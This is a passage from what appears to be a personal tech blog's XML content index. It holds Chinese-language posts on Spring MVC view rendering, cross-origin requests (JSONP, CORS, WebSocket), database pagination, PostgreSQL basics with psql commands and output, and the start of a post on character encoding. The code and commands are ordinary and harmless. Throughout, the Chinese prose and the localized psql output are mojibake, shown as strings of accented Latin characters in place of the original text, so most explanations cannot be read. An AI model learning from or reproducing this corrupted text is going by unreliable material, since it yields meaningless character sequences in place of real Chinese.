class="title">resolveViewName</span><span class="params">(String viewName, Map&lt;String, Object&gt; model, Locale locale,</span></span></span><br><span class="line"><span class="function"><span class="params">		HttpServletRequest request)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">for</span> (ViewResolver viewResolver : <span class="keyword">this</span>.viewResolvers) &#123;</span><br><span class="line">				View view = viewResolver.resolveViewName(viewName, locale);</span><br><span class="line">				<span class="keyword">if</span> (view != <span class="keyword">null</span>) &#123;</span><br><span class="line">					<span class="keyword">return</span> view;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
<p>æœ€ç»ˆè§†å›¾çš„æ¸²æŸ“æ˜¯Viewä¸­å®šä¹‰çš„<code>render</code>æ–¹æ³•è¿›è¡Œçš„ï¼Œå®ƒæ˜¯ä¸€ä¸ªæŠ½è±¡çš„æ¥å£</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Render the view given the specified model.</span></span><br><span class="line"><span class="comment">	 * &lt;p&gt;The first step will be preparing the request: In the JSP case,</span></span><br><span class="line"><span class="comment">	 * this would mean setting model objects as request attributes.</span></span><br><span class="line"><span class="comment">	 * The second step will be the actual rendering of the view,</span></span><br><span class="line"><span class="comment">	 * for example including the JSP via a RequestDispatcher.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> model Map with name Strings as keys and corresponding model</span></span><br><span class="line"><span class="comment">	 * objects as values (Map can also be &#123;<span class="doctag">@code</span> null&#125; in case of empty model)</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> request current HTTP request</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> response HTTP response we are building</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@throws</span> Exception if rendering failed</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">render</span><span class="params">(Map&lt;String, ?&gt; model, HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception</span>;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> spring </category>
            
        </categories>
        
        
        <tags>
            
            <tag> spring mvc </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[JSè·¨åŸŸåŸç†]]></title>
      <url>http://qsli.github.io/2016/10/02/jsonp/</url>
      <content type="html"><![CDATA[<h2 id="åŒæºç­–ç•¥"><a href="#åŒæºç­–ç•¥" class="headerlink" title="åŒæºç­–ç•¥"></a>åŒæºç­–ç•¥</h2><blockquote>
<p>åŒæºç­–ç•¥é™åˆ¶äº†ä¸€ä¸ªæºï¼ˆoriginï¼‰ä¸­åŠ è½½æ–‡æœ¬æˆ–è„šæœ¬ä¸æ¥è‡ªå…¶å®ƒæºï¼ˆoriginï¼‰ä¸­èµ„æºçš„äº¤äº’æ–¹å¼ã€‚</p>
</blockquote>
<p>ä¾‹å¦‚åœ¨ä½¿ç”¨XMLHttpRequest æˆ– <img> æ ‡ç­¾æ—¶åˆ™ä¼šå—åˆ°åŒæºç­–ç•¥çš„çº¦æŸã€‚äº¤äº’é€šå¸¸åˆ†ä¸ºä¸‰ç±»ï¼š</p>
<ol>
<li><p>é€šå¸¸å…è®¸è¿›è¡Œè·¨åŸŸå†™æ“ä½œï¼ˆ<code>Cross-origin writes</code>ï¼‰ã€‚ä¾‹å¦‚é“¾æ¥ï¼ˆlinksï¼‰ï¼Œé‡å®šå‘ä»¥åŠè¡¨å•æäº¤ã€‚ç‰¹å®šå°‘æ•°çš„HTTPè¯·æ±‚éœ€è¦æ·»åŠ  preflightã€‚</p>
</li>
<li><p>é€šå¸¸å…è®¸è·¨åŸŸèµ„æºåµŒå…¥ï¼ˆ<code>Cross-origin embedding</code>ï¼‰ã€‚</p>
</li>
<li>é€šå¸¸ä¸å…è®¸è·¨åŸŸè¯»æ“ä½œï¼ˆ<code>Cross-origin reads</code>ï¼‰ã€‚</li>
</ol>
<p>ä¸‹è¡¨ç»™å‡ºäº†ç›¸å¯¹<code>http://store.company.com/dir/page.html</code>åŒæºæ£€æµ‹çš„ç¤ºä¾‹:</p>
<table>
<thead>
<tr>
<th>URL</th>
<th>ç»“æœ</th>
<th>åŸå› </th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="http://store.company.com/dir2/other.html" rel="external nofollow noopener noreferrer" target="_blank">http://store.company.com/dir2/other.html</a></td>
<td>æˆåŠŸ</td>
<td></td>
</tr>
<tr>
<td><a href="http://store.company.com/dir/inner/another.html" rel="external nofollow noopener noreferrer" target="_blank">http://store.company.com/dir/inner/another.html</a></td>
<td>æˆåŠŸ</td>
<td></td>
</tr>
<tr>
<td><a href="https://store.company.com/secure.html" rel="external nofollow noopener noreferrer" target="_blank">https://store.company.com/secure.html</a></td>
<td>å¤±è´¥</td>
<td>åè®®ä¸åŒ</td>
</tr>
<tr>
<td><a href="http://store.company.com:81/dir/etc.html" rel="external nofollow noopener noreferrer" target="_blank">http://store.company.com:81/dir/etc.html</a></td>
<td>å¤±è´¥</td>
<td>ç«¯å£ä¸åŒ</td>
</tr>
<tr>
<td><a href="http://news.company.com/dir/other.html" rel="external nofollow noopener noreferrer" target="_blank">http://news.company.com/dir/other.html</a></td>
<td>å¤±è´¥</td>
<td>ä¸»æœºåä¸åŒ</td>
</tr>
</tbody>
</table>
<h2 id="ajax-è·¨åŸŸ"><a href="#ajax-è·¨åŸŸ" class="headerlink" title="ajax è·¨åŸŸ"></a>ajax è·¨åŸŸ</h2><blockquote>
<p>åŒæºæ”¿ç­–è§„å®šï¼ŒAJAXè¯·æ±‚åªèƒ½å‘ç»™åŒæºçš„ç½‘å€ï¼Œå¦åˆ™å°±æŠ¥é”™ã€‚</p>
</blockquote>
<p>è¯·æ±‚å…¶ä»–åŸŸèµ„æºçš„æ—¶å€™ï¼Œç”±äºåŒæºç­–ç•¥çš„é™åˆ¶ä¸€èˆ¬ä¼šå‡ºç°å¦‚ä¸‹çš„é”™è¯¯ï¼š</p>
<blockquote>
<p>XMLHttpRequest cannot load <a href="http://xxxxx" rel="external nofollow noopener noreferrer" target="_blank">http://xxxxx</a>. No â€˜Access-Control-Allow-Originâ€™ header is present on the requested resource. Origin â€˜nullâ€™ is therefore not allowed access. The response had HTTP status code 500.</p>
</blockquote>
<h3 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h3><p><code>&lt;script src=&quot;...&quot;&gt;&lt;/script&gt;</code> æ ‡ç­¾æ˜¯æ”¯æŒè·¨åŸŸçš„ï¼ŒJSONPçš„åŸç†å°±æ˜¯ä½¿ç”¨è¿™ä¸ªæ ‡ç­¾ã€‚</p>
<p>æœåŠ¡å™¨ä¼šåœ¨ä¼ ç»™æµè§ˆå™¨å‰å°†JSONæ•°æ®å¡«å……åˆ°å›è°ƒå‡½æ•°ä¸­</p>
<script src="//gist.github.com/cc896797f4ef746e9cbc75b8f6ebc24f.js"></script>
<p>ä¸Šè¿°ä»£ç ä¸­<code>return param + &#39;(&#39; + json.dumps(data) + &#39;)&#39;</code>æ˜¯å°†è¿”å›çš„æ•°æ®å¡«å……åˆ°å›è°ƒå‡½æ•°ä¸­</p>
<p>å‰ç«¯çš„ä»£ç å¦‚ä¸‹ï¼š</p>
<script src="//gist.github.com/8d90c2a0599818488a647177b4f196c2.js"></script>
<p>ä½¿ç”¨äº†jQueryçš„ajaxè¯·æ±‚</p>
<p><strong>ä½†æ˜¯JSONPçš„æ–¹å¼åªæ”¯æŒgetè¯·æ±‚</strong></p>
<h3 id="CORS-Cross-Origin-Resource-Sharing"><a href="#CORS-Cross-Origin-Resource-Sharing" class="headerlink" title="CORS (Cross-Origin Resource Sharing)"></a>CORS (<code>Cross-Origin Resource Sharing</code>)</h3><p>CORSæ˜¯ä¸€ä¸ªW3Cæ ‡å‡†, ä¸ä»…æ”¯æŒGETæ–¹å¼è¿˜æ”¯æŒPOSTæ–¹å¼çš„è·¨åŸŸè¯·æ±‚</p>
<blockquote>
<p>æµè§ˆå™¨å°†CORSè¯·æ±‚åˆ†æˆä¸¤ç±»ï¼šç®€å•è¯·æ±‚ï¼ˆsimple requestï¼‰å’Œéç®€å•è¯·æ±‚ï¼ˆnot-so-simple requestï¼‰ã€‚</p>
</blockquote>
<p>è¯·æ±‚çš„æµç¨‹å›¾å¦‚ä¸‹ï¼š<br><img src="/2016/10/02/jsonp/cors.png"></p>
<p>è¯¦ç»†åŸç†å‚è€ƒé˜®ä¸€å³°è€å¸ˆçš„<a href="http://www.ruanyifeng.com/blog/2016/04/cors.html" rel="external nofollow noopener noreferrer" target="_blank">è·¨åŸŸèµ„æºå…±äº« CORS è¯¦è§£</a></p>
<h3 id="Websocket"><a href="#Websocket" class="headerlink" title="Websocket"></a>Websocket</h3><blockquote>
<p>WebSocketæ˜¯ä¸€ç§é€šä¿¡åè®®ï¼Œä½¿ç”¨ws://ï¼ˆéåŠ å¯†ï¼‰å’Œwss://ï¼ˆåŠ å¯†ï¼‰ä½œä¸ºåè®®å‰ç¼€ã€‚è¯¥åè®®ä¸å®è¡ŒåŒæºæ”¿ç­–ï¼Œåªè¦æœåŠ¡å™¨æ”¯æŒï¼Œå°±å¯ä»¥é€šè¿‡å®ƒè¿›è¡Œè·¨æºé€šä¿¡ã€‚</p>
</blockquote>
<p>è¯¦ç»†åŸç†å‚è€ƒé˜®ä¸€å³°è€å¸ˆçš„ <a href="https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy" rel="external nofollow noopener noreferrer" target="_blank">æµè§ˆå™¨çš„åŒæºç­–ç•¥</a></p>
<h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><ol>
<li><p><a href="http://www.ruanyifeng.com/blog/2016/04/cors.html" rel="external nofollow noopener noreferrer" target="_blank">è·¨åŸŸèµ„æºå…±äº« CORS è¯¦è§£</a></p>
</li>
<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy" rel="external nofollow noopener noreferrer" target="_blank">æµè§ˆå™¨çš„åŒæºç­–ç•¥</a></p>
</li>
<li><p><a href="http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html" rel="external nofollow noopener noreferrer" target="_blank">æµè§ˆå™¨åŒæºæ”¿ç­–åŠå…¶è§„é¿æ–¹æ³•</a></p>
</li>
<li><p><a href="http://blog.csdn.net/fdipzone/article/details/46390573" rel="external nofollow noopener noreferrer" target="_blank"> ajax è®¾ç½®Access-Control-Allow-Originå®ç°è·¨åŸŸè®¿é—®</a></p>
</li>
<li><p><a href="http://liuwanlin.info/corsxiang-jie/" rel="external nofollow noopener noreferrer" target="_blank">ä½¿ç”¨CORSï¼ˆè¯‘ï¼‰</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> fe </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ajax </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[æ•°æ®åº“åˆ†é¡µ]]></title>
      <url>http://qsli.github.io/2016/09/30/pagination/</url>
      <content type="html"><![CDATA[<h2 id="é€»è¾‘åˆ†é¡µ"><a href="#é€»è¾‘åˆ†é¡µ" class="headerlink" title="é€»è¾‘åˆ†é¡µ"></a>é€»è¾‘åˆ†é¡µ</h2><p>å°±æ˜¯å°†æ‰€æœ‰çš„ç»“æœé›†æ‹¿å‡ºæ¥ï¼Œç„¶ååœ¨ç¨‹åºä¸­è¿›è¡Œæˆªå–ï¼Œç”±äºæ‰€æœ‰çš„æ•°æ®éƒ½æ˜¯åœ¨å†…å­˜ä¸­çš„ï¼Œå ç”¨å†…å­˜æ¯”è¾ƒå¤§</p>
<h2 id="ç‰©ç†åˆ†é¡µ"><a href="#ç‰©ç†åˆ†é¡µ" class="headerlink" title="ç‰©ç†åˆ†é¡µ"></a>ç‰©ç†åˆ†é¡µ</h2><p>ç‰©ç†åˆ†é¡µæ˜¯æŒ‡åŸºäºæ•°æ®åº“æä¾›çš„ç±»ä¼¼ <code>limit offset,rows</code>è¿™æ ·çš„è¯­æ³•ã€‚</p>
<p>ä½†æ˜¯ï¼Œæ¯”å¦‚<code>limit 10000,20</code>,  å°±ä¼šè¯»å–10020æ¡æ•°æ®ï¼Œä½†æ˜¯åªä¼šè¿”å›åé¢20æ¡æ•°æ®ã€‚</p>
<h2 id="æ‰‹å·¥è®¡ç®—"><a href="#æ‰‹å·¥è®¡ç®—" class="headerlink" title="æ‰‹å·¥è®¡ç®—"></a>æ‰‹å·¥è®¡ç®—</h2><p>å¦‚æœidæ˜¯æœ‰åºçš„ï¼Œå¯ä»¥åšä¸€ä¸ªç®€å•çš„è½¬æ¢ï¼Œæ¯”å¦‚ä½¿ç”¨  <code>where id between 10000 and 10020</code>, è¿™æ ·çš„æ•ˆç‡å°±ä¼šç›¸å¯¹çš„é«˜äº›</p>
<h2 id="é™„ä»¶"><a href="#é™„ä»¶" class="headerlink" title="é™„ä»¶"></a>é™„ä»¶</h2><p> <a href="PPC2009_mysql_pagination.pdf">PPC2009_mysql_pagination.pdf</a></p>
]]></content>
      
        <categories>
            
            <category> base </category>
            
        </categories>
        
        
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Postgreæ•°æ®åº“ç®€ä»‹]]></title>
      <url>http://qsli.github.io/2016/09/27/postgre/</url>
      <content type="html"><![CDATA[<p><img src="https://www.postgresql.org/media/img/layout/hdr_left.png" alt></p>
<h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><blockquote>
<p>PostgreSQLæ˜¯è‡ªç”±çš„å¯¹è±¡-å…³ç³»å‹æ•°æ®åº“æœåŠ¡å™¨ï¼ˆæ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼‰</p>
</blockquote>
<blockquote>
<p><a href="https://zh.wikipedia.org/wiki/PostgreSQL" rel="external nofollow noopener noreferrer" target="_blank">https://zh.wikipedia.org/wiki/PostgreSQL</a></p>
</blockquote>
<p>å‘å±•æµç¨‹:</p>
<img src="/2016/09/27/postgre/history.jpg">
<blockquote>
<p>PostgreSQL çš„å‰èº«æ˜¯ BSD çš„å§‹äº 1977 å¹´çš„ Ingres é¡¹ç›®ï¼Œ82å¹´ï¼Œé¡¹ç›®é¢†å¯¼äººMichael Stonebraker å°†å…¶å•†ä¸šåŒ–ã€‚85å¹´æ­£å¼æ›´åä¸ºPostgresã€‚</p>
</blockquote>
<blockquote>
<p>92å¹´ä¸¤åä¼¯å…‹åˆ©çš„ç ”ç©¶ç”Ÿåœ¨åšç ”ç©¶ç”Ÿè¯¾é¢˜çš„æ—¶å€™ï¼Œç”¨SQL92æ›¿æ¢äº†åŸæœ‰çš„Postquelä½œä¸ºæŸ¥è¯¢è¯­è¨€ï¼Œå¹¶å°†å…¶æ›´åä¸ºPostgres95ã€‚</p>
</blockquote>
<blockquote>
<p>96å¹´ï¼Œä¸€ç¾¤é»‘å®¢ä»¬æ¥æ‰‹äº†Postgres95ï¼Œå¼€å§‹ä¿®æ”¹åŠç¨³å®šå®ƒçš„ä»£ç ï¼Œå¹¶ä¸åŒå¹´8æœˆå‘å¸ƒäº†ç¬¬ä¸€ä¸ªå¼€æºç‰ˆæœ¬ï¼Œå°†å…¶æ›´åä¸ºPostgreSQLã€‚</p>
</blockquote>
<p>PGæ”¯æŒçš„æ•°æ®ç±»å‹éå¸¸ä¸°å¯Œï¼Œä»–æ”¯æŒä»»æ„ç²¾åº¦çš„æ•°å€¼ç±»å‹ï¼Œæ— é™é•¿åº¦çš„æ–‡æœ¬ç±»å‹ï¼ŒåŒæ—¶å…·æœ‰ä¸€äº›nosqlçš„ç‰¹æ€§ï¼Œä¹Ÿå¯ä»¥å­˜å‚¨hashè¡¨ï¼ˆhstoreï¼‰ï¼Œltreeæ ‘çŠ¶ç»“æ„ï¼Œæ”¯æŒjsonbã€xmlã€arrayçš„å­˜å‚¨å’Œæ“ä½œã€‚åŒæ—¶PGæä¾›äº†å¯¹IPåœ°å€å’Œåœ°ç†ä¿¡æ¯çš„è‰¯å¥½æ”¯æŒã€‚</p>
<p>PGæ”¯æŒçš„è¯­è¨€éå¸¸å¤šï¼Œå„ç§è„šæœ¬è¯­è¨€ï¼Œä¾‹å¦‚ï¼šLuaã€Perlã€Pythonã€Rubyç­‰ï¼Œä¹Ÿæ”¯æŒå„ç§ç¼–è¯‘è¯­è¨€ï¼Œå¦‚cã€c++å’ŒJAVAç­‰ï¼Œå¯¹ç»Ÿè®¡è¯­è¨€Rä¹Ÿæœ‰è‰¯å¥½çš„æ”¯æŒã€‚</p>
<p>æ¶æ„å›¾ï¼š</p>
<img src="/2016/09/27/postgre/arch.jpg">
<blockquote>
<p>å›¾ç‰‡æ¥è‡ª<br><a href="https://wiki.postgresql.org/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AF%B9%E6%AF%94" rel="external nofollow noopener noreferrer" target="_blank">https://wiki.postgresql.org/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AF%B9%E6%AF%94</a></p>
</blockquote>
<p>PostgreSQLé‡‡ç”¨çš„æ˜¯C/Sç»“æ„ï¼Œä¸€ä¸ªå®¢æˆ·ç«¯å¯¹åº”ä¸€ä¸ªæœåŠ¡å™¨ç«¯çš„å®ˆæŠ¤è¿›ç¨‹(å¼€é”€ä¼šç•¥å¤§)</p>
<h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><p>å‚è€ƒå®˜ç½‘ï¼š<a href="https://www.postgresql.org/download/" rel="external nofollow noopener noreferrer" target="_blank">https://www.postgresql.org/download/</a></p>
<p>ä¹Ÿå¯ä»¥å‚è€ƒé˜®ä¸€å³°è€å¸ˆçš„è¿™ç¯‡ <a href="http://www.ruanyifeng.com/blog/2013/12/getting_started_with_postgresql.html" rel="external nofollow noopener noreferrer" target="_blank">PostgreSQLæ–°æ‰‹å…¥é—¨</a></p>
<h2 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h2><p><a href="http://www.postgres.cn/docs/9.5/" rel="external nofollow noopener noreferrer" target="_blank">PostgreSQL 9.5.3 ä¸­æ–‡åœ¨çº¿æ‰‹å†Œ</a></p>
<p><a href="https://github.com/postgres-cn/pgdoc-cn/releases" rel="external nofollow noopener noreferrer" target="_blank">ç¦»çº¿ä¸­æ–‡æ‰‹å†Œ</a></p>
<h3 id="psql-â€“-PostgreSQLçš„äº¤äº’å¼ç»ˆç«¯çš„ä½¿ç”¨"><a href="#psql-â€“-PostgreSQLçš„äº¤äº’å¼ç»ˆç«¯çš„ä½¿ç”¨" class="headerlink" title="psql â€“  PostgreSQLçš„äº¤äº’å¼ç»ˆç«¯çš„ä½¿ç”¨"></a>psql â€“  PostgreSQLçš„äº¤äº’å¼ç»ˆç«¯çš„ä½¿ç”¨</h3><p>è¯¦ç»†è¯·å‚è§ <a href="http://www.postgres.cn/docs/9.5/app-psql.html" rel="external nofollow noopener noreferrer" target="_blank">psql</a></p>
<p>ç™»å½•åˆ°æ•°æ®åº“ï¼Œç±»ä¼¼mysql<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psql -U dbuser -d exampledb -h 127.0.0.1 -p 5432</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>-UæŒ‡å®šç”¨æˆ·ï¼Œ-dæŒ‡å®šæ•°æ®åº“ï¼Œ-hæŒ‡å®šæœåŠ¡å™¨ï¼Œ-pæŒ‡å®šç«¯å£ã€‚</p>
</blockquote>
<table>
<thead>
<tr>
<th>å‘½ä»¤</th>
<th>ä½œç”¨</th>
</tr>
</thead>
<tbody>
<tr>
<td>\h</td>
<td>æŸ¥çœ‹SQLå‘½ä»¤çš„è§£é‡Šï¼Œæ¯”å¦‚\h selectã€‚</td>
</tr>
<tr>
<td>\?</td>
<td>æŸ¥çœ‹psqlå‘½ä»¤åˆ—è¡¨ã€‚</td>
</tr>
<tr>
<td>\l</td>
<td>åˆ—å‡ºæ‰€æœ‰æ•°æ®åº“ã€‚</td>
</tr>
<tr>
<td>\c [database_name]ï¼š</td>
<td>è¿æ¥å…¶ä»–æ•°æ®åº“ã€‚</td>
</tr>
<tr>
<td>\d</td>
<td>åˆ—å‡ºå½“å‰æ•°æ®åº“çš„æ‰€æœ‰è¡¨æ ¼ã€‚</td>
</tr>
<tr>
<td>\d [table_name]ï¼š</td>
<td>åˆ—å‡ºæŸä¸€å¼ è¡¨æ ¼çš„ç»“æ„ã€‚</td>
</tr>
<tr>
<td>\di</td>
<td>æŸ¥çœ‹ç´¢å¼•</td>
</tr>
<tr>
<td>\du</td>
<td>åˆ—å‡ºæ‰€æœ‰ç”¨æˆ·ã€‚</td>
</tr>
<tr>
<td>\e</td>
<td>æ‰“å¼€æ–‡æœ¬ç¼–è¾‘å™¨ã€‚</td>
</tr>
<tr>
<td>\! pwd</td>
<td>æ˜¾ç¤ºå½“å‰å·¥ä½œç›®å½•</td>
</tr>
<tr>
<td>\q</td>
<td>é€€å‡ºäº¤äº’shell</td>
</tr>
<tr>
<td>\conninfo</td>
<td>åˆ—å‡ºå½“å‰æ•°æ®åº“å’Œè¿æ¥çš„ä¿¡æ¯ã€‚</td>
</tr>
</tbody>
</table>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">exampledb=&gt; \d</span><br><span class="line">             å…³è”åˆ—è¡¨             </span><br><span class="line">æ¶æ„æ¨¡å¼ |   åç§°   |  ç±»å‹  | æ‹¥æœ‰è€…</span><br><span class="line">----------+----------+--------+--------</span><br><span class="line">public   | user_tbl | æ•°æ®è¡¨ | dbuser</span><br><span class="line">(1 è¡Œè®°å½•)</span><br><span class="line"></span><br><span class="line">exampledb=&gt; \l</span><br><span class="line">                                                      æ•°æ®åº“åˆ—è¡¨</span><br><span class="line"> åç§°    |  æ‹¥æœ‰è€…  | å­—å…ƒç¼–ç  |            æ ¡å¯¹è§„åˆ™            |             Ctype              |       å­˜å–æƒé™</span><br><span class="line">-----------+----------+----------+--------------------------------+--------------------------------+-----------------------</span><br><span class="line">exampledb | dbuser   | UTF8     | Chinese (Simplified)_China.936 | Chinese (Simplified)_China.936 | =Tc/dbuser           +</span><br><span class="line">         |          |          |                                |                                | dbuser=CTc/dbuser</span><br><span class="line">postgres  | postgres | UTF8     | Chinese (Simplified)_China.936 | Chinese (Simplified)_China.936 |</span><br><span class="line">template0 | postgres | UTF8     | Chinese (Simplified)_China.936 | Chinese (Simplified)_China.936 | =c/postgres          +</span><br><span class="line">         |          |          |                                |                                | postgres=CTc/postgres</span><br><span class="line">template1 | postgres | UTF8     | Chinese (Simplified)_China.936 | Chinese (Simplified)_China.936 | =c/postgres          +</span><br><span class="line">         |          |          |                                |                                | postgres=CTc/postgres</span><br><span class="line">(4 è¡Œè®°å½•)</span><br><span class="line"></span><br><span class="line">exampledb=&gt; \du</span><br><span class="line">                           è§’è‰²åˆ—è¡¨</span><br><span class="line">è§’è‰²åç§° |                    å±æ€§                    | æˆå‘˜å±äº</span><br><span class="line">----------+--------------------------------------------+----------</span><br><span class="line">dbuser   |                                            | &#123;&#125;</span><br><span class="line">postgres | è¶…çº§ç”¨æˆ·, å»ºç«‹è§’è‰², å»ºç«‹ DB, å¤åˆ¶, ç»•è¿‡RLS | &#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exampledb=&gt; \dt</span><br><span class="line">             å…³è”åˆ—è¡¨</span><br><span class="line">æ¶æ„æ¨¡å¼ |   åç§°   |  ç±»å‹  | æ‹¥æœ‰è€…</span><br><span class="line">----------+----------+--------+--------</span><br><span class="line">public   | user_tbl | æ•°æ®è¡¨ | dbuser</span><br><span class="line">(1 è¡Œè®°å½•)</span><br><span class="line"></span><br><span class="line">exampledb=&gt; \d user_tbl;</span><br><span class="line">         æ•°æ®è¡¨ "public.user_tbl"</span><br><span class="line">  æ ä½     |         ç±»å‹          | ä¿®é¥°è¯</span><br><span class="line">-------------+-----------------------+--------</span><br><span class="line">name        | character varying(20) |</span><br><span class="line">signup_date | date                  |</span><br></pre></td></tr></table></figure>
<h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><ol>
<li><p><a href="http://www.infoq.com/cn/articles/underlying-storage-of-uber-change-from-mysql-to-postgres" rel="external nofollow noopener noreferrer" target="_blank">Uberçš„åº•å±‚å­˜å‚¨ä»Postgresæ¢æˆMySQLä¹‹å</a></p>
</li>
<li><p><a href="http://database.51cto.com/art/200511/10875.htm" rel="external nofollow noopener noreferrer" target="_blank">PostgreSQLæ•°æ®åº“çš„ç‰¹ç‚¹</a></p>
</li>
<li><p><a href="http://www.ruanyifeng.com/blog/2013/12/getting_started_with_postgresql.html" rel="external nofollow noopener noreferrer" target="_blank">PostgreSQLæ–°æ‰‹å…¥é—¨_é˜®ä¸€å³°</a></p>
</li>
<li><p><a href="http://book.51cto.com/art/201201/313178.htm" rel="external nofollow noopener noreferrer" target="_blank">PostgreSQLç®€ä»‹åŠå‘å±•å†ç¨‹</a></p>
</li>
<li><p><a href="https://wiki.postgresql.org/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AF%B9%E6%AF%94" rel="external nofollow noopener noreferrer" target="_blank">æ•°æ®åº“å¯¹æ¯”_wiki</a></p>
</li>
<li><p><a href="https://github.com/postgres-cn/pgdoc-cn" rel="external nofollow noopener noreferrer" target="_blank">postgres-cn/pgdoc-cn</a></p>
</li>
<li><p><a href="http://blog.51yip.com/pgsql/1525.html" rel="external nofollow noopener noreferrer" target="_blank">postgresql æŸ¥çœ‹æ•°æ®åº“,è¡¨,ç´¢å¼•,è¡¨ç©ºé—´ä»¥åŠå¤§å°</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> base </category>
            
        </categories>
        
        
        <tags>
            
            <tag> postgresql </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Unicodeå†å²]]></title>
      <url>http://qsli.github.io/2016/09/26/character-encoding/</url>
      <content type="html"><![CDATA[<h2 id="Character-set-ï¼ˆå­—ç¬¦é›†ï¼‰"><a href="#Character-set-ï¼ˆå­—ç¬¦é›†ï¼‰" class="headerlink" title="Character set ï¼ˆå­—ç¬¦é›†ï¼‰"></a>Character set ï¼ˆå­—ç¬¦é›†ï¼‰</h2><p>ç®€å•çš„è¯´ï¼Œå°±æ˜¯è®¡ç®—æœºåªè®¤<code>0</code>å’Œ<code>1</code>ï¼Œäºæ˜¯åœ¨æ•°æ®å–å‡ºæ¥çš„æ—¶å€™æ ¹æ®ä¸€ä¸ªç±»ä¼¼å­—å…¸çš„ä¸œè¥¿ï¼ŒæŒ‰ç…§ä¸€å®šçš„è§„åˆ™å°†æ¯”ç‰¹ä¿¡æ¯è½¬æ¢æˆå¯¹åº”çš„å­—ç¬¦ä¿¡æ¯ï¼Œè¿™æ ·äººä»¬æ‰å¯ä»¥ç†è§£åˆ°åº•å­˜å‚¨äº†ä»€ä¹ˆã€‚</p>
<h3 id="ASCIIç¼–ç "><a href="#ASCIIç¼–ç " class="headerlink" title="ASCIIç¼–ç "></a>ASCIIç¼–ç </h3><p><code>ASCII</code>ï¼ˆAmerican Standard Code for Information Interchangeï¼‰ ç¼–ç æ˜¯åŸºäºæ‹‰ä¸å­—æ¯çš„ä¸€å¥—ç¼–ç ç³»ç»Ÿã€‚</p>
<p><code>ASCII</code>ä½¿ç”¨æŒ‡å®šçš„<code>7</code> ä½æˆ–<code>8</code> ä½äºŒè¿›åˆ¶æ•°ç»„åˆæ¥è¡¨ç¤º<code>128</code> æˆ–<code>256</code> ç§å¯èƒ½çš„å­—ç¬¦ã€‚</p>
<blockquote>
